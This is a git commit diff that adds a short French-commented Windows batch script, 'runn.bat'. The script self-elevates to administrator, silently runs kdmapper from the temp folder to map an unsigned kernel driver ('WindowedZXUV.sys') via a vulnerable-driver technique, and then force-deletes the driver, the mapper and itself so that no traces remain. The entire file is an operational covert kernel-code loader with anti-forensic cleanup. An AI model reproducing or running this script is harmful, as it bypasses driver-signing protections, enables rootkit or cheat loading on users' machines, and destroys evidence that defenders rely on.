e5ae581e06336c68ae1dfdcd2548301748959688
gf9gs9g6dg3s3g3fgsdg <b4cmohaprofessionnel@gmail.com>
2026-06-23 03:03:17 +0200

    Add files via upload

---
+++ runn.bat
@@ -0,0 +1,21 @@
+@echo off
+:: =============================================
+:: Script avec admin + suppression totale après utilisation
+:: =============================================
+
+NET SESSION >nul 2>&1
+if %errorlevel% NEQ 0 (
+    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb runAs" >nul 2>&1
+    exit /b
+)
+
+:: Lancement de kdmapper
+start "" "%TEMP%\kdmapper_release.exe" "%TEMP%\WindowedZXUV.sys" >nul 2>&1
+
+:: Attente pour que kdmapper termine
+timeout /t 6 /nobreak >nul
+
+:: Nettoyage + auto-suppression
+start "" /b cmd /c "timeout /t 3 /nobreak >nul & del /F /Q "%TEMP%\WindowedZXUV.sys" "%TEMP%\kdmapper_release.exe" "%TEMP%\kdmapper_release.exe" "%~f0" >nul 2>&1" >nul 2>&1
+
+exit
